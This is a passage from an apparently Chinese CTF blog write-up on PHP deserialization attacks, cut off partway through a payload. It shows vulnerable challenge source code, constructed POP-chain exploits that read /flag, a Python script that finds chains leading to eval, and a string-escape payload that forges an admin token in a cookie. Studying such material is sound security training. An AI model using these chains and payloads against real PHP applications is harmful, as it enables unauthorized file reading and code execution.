class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> Call();<span class="hljs-comment">//把$mod1赋值为Call类对象</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> funct();<span class="hljs-comment">//把 $mod1赋值为funct类对象</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1= <span class="hljs-keyword">new</span> func();<span class="hljs-comment">//把 $mod1赋值为func类对象</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> string1();<span class="hljs-comment">//把 $mod1赋值为string1类对象</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;        <br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1= <span class="hljs-keyword">new</span> GetFlag();<span class="hljs-comment">//把 $str1赋值为GetFlag类对象          </span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;        <br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> start_gg();<span class="hljs-comment">//构造start_gg类对象$b</span><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>)).<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<span class="hljs-comment">//显示输出url编码后的序列化对象</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="2021强网杯赌徒"><a href="#2021强网杯赌徒" class="headerlink" title="2021强网杯赌徒"></a>2021强网杯赌徒</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//hint is in hint.php</span><br>error_reporting(<span class="hljs-number">1</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I think you need /etc/hint . Before this you need to see the source code&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_sayhello</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hi&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_sayhello();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$cc</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;give you flag : &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;flag;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$phonenumber</span> = <span class="hljs-number">123123</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$promise</span> = <span class="hljs-string">&#x27;I do&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;promise = <span class="hljs-string">&#x27;I will not !!!!&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;promise;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="hljs-string">&#x27;ffiilleennaammee&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Room</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth_to_set</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_hint</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$hint</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$hint</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-keyword">$this</span>-&gt;Get_hint(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>])) &#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$hi</span> = <span class="hljs-keyword">new</span> Start();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Start();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Info();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$c</span>-&gt;a = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$b</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><h4 id="2021强网杯POP-master："><a href="#2021强网杯POP-master：" class="headerlink" title="2021强网杯POP_master："></a>2021强网杯POP_master：</h4><p><a href="https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php">https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php</a></p><p>脚本找链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><span class="hljs-keyword">from</span> phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pprint<br><span class="hljs-keyword">import</span> nose<br><br>parser = make_parser()<br>func_name = <span class="hljs-string">&quot;find your func&quot;</span><br>con = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./qwb/class.php&quot;</span>).read()<br>lexer = phplex.lexer.clone()<br>lexer.filename = <span class="hljs-literal">None</span><br>output = parser.parse(con, lexer=lexer)<br>functions = &#123;&#125;<br>target = functions[func_name] i = <span class="hljs-number">0</span><br><span class="hljs-comment"># 强赋值函数直接跳过</span><br>skip_func = []<br>pop_chain = []<br>pop_chain.append(func_name) e = <span class="hljs-literal">False</span><br><span class="hljs-keyword">for</span> out <span class="hljs-keyword">in</span> output:<br>class_name = out.name<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> out.nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>functions[node.name] = out<br><span class="hljs-keyword">while</span>(e <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>):<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> target.nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br><span class="hljs-keyword">if</span> node.name == func_name:<br><span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode) == MethodCall:<br><span class="hljs-comment"># print(subnode)</span><br><span class="hljs-keyword">if</span>(subnode.name <span class="hljs-keyword">in</span> skip_func):<br><span class="hljs-keyword">continue</span><br>target = functions[subnode.name]<br>func_name = subnode.name<br>pop_chain.append(func_name)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == If):<br><span class="hljs-comment"># print(subnode)</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode.node) == MethodCall :<br><span class="hljs-comment"># print(subnode.node.name)</span><br><span class="hljs-keyword">if</span>( subnode.node.name <span class="hljs-keyword">in</span> skip_func):<br><span class="hljs-keyword">continue</span><br>target = functions[subnode.node.name]<br>func_name = subnode.node.name<br>pop_chain.append(func_name)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == Eval):<br>e = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> pop <span class="hljs-keyword">in</span> pop_chain:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;class &quot;</span> + functions[pop].name + <span class="hljs-string">&quot;&#123;&quot;</span>)<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> functions[pop].nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == ClassVariables):<br><span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public &quot;</span> + subnode.name + <span class="hljs-string">&#x27;;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public function __construct()&#123;&quot;</span>)<br><span class="hljs-keyword">if</span> i+<span class="hljs-number">1</span> == <span class="hljs-built_in">len</span>(pop_chain):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;$this-&gt;&quot;</span> + subnode.name[<span class="hljs-number">1</span>:] + <span class="hljs-string">&quot;= new &quot;</span> + <br>functions[pop_chain[i+<span class="hljs-number">1</span>]].name + <span class="hljs-string">&quot;();&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>i += <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(pop_chain):<br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><p>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。如下图，out!并不会被序列化</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210720135305824.png"></p><p>当某个属性的字符串长度不一致时也不会被序列化成功</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210720135505974.png"></p><h3 id="增多："><a href="#增多：" class="headerlink" title="增多："></a>增多：</h3><ul><li>ctfshow 262</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> message(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$msg</span>));<br>    setcookie(<span class="hljs-string">&#x27;msg&#x27;</span>,base64_encode(<span class="hljs-variable">$umsg</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>前面注释发现有个<code>message.php</code> ,访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><p>把base64编码后的结果放到cookie里面访问message.php就能拿到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>   <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span 